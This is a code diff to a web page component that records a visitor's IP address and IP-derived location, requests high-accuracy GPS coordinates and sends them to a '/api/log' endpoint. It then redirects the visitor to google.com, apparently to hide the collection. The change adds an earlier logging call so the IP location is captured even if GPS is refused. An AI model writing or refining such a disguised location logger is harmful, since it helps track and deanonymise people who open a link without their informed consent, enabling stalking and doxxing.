@@ -23,7 +23,22 @@ export default function Page() {
           [ipLatitude, ipLongitude] = geoData.loc.split(',');
         }
 
-        // Step 3: Try precise GPS location using the Geolocation API
+        // Step 3: Log IP-based location to the backend (even before getting GPS)
+        await fetch('/api/log', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            ip: userIp,
+            ipLatitude,
+            ipLongitude,
+            gpsLatitude: null, // Placeholder for GPS, which will be updated later
+            gpsLongitude: null, // Placeholder for GPS
+          }),
+        });
+
+        // Step 4: Try fetching the precise GPS location, but only after logging IP-based location
         if (navigator.geolocation) {
           await new Promise((resolve) => {
             navigator.geolocation.getCurrentPosition(
@@ -34,14 +49,14 @@ export default function Page() {
               },
               (error) => {
                 console.warn('Geolocation error:', error);
-                resolve(); // Use IP-based location as fallback
+                resolve(); // If geolocation fails, use IP-based location
               },
               { enableHighAccuracy: true }
             );
           });
         }
 
-        // Step 4: Log both IP-based and GPS-based data to the backend
+        // Step 5: Log GPS-based location (if available) to the backend
         await fetch('/api/log', {
           method: 'POST',
           headers: {
@@ -51,12 +66,12 @@ export default function Page() {
             ip: userIp,
             ipLatitude,
             ipLongitude,
-            gpsLatitude: gpsLatitude || null, // Null if unavailable
-            gpsLongitude: gpsLongitude || null, // Null if unavailable
+            gpsLatitude: gpsLatitude || null, // Log GPS location if available
+            gpsLongitude: gpsLongitude || null, // Log GPS location if available
           }),
         });
 
-        // Step 5: Redirect to Google
+        // Step 6: Redirect to Google
         window.location.href = 'https://google.com';
       } catch (error) {
         console.error('Error fetching or logging location:', error);
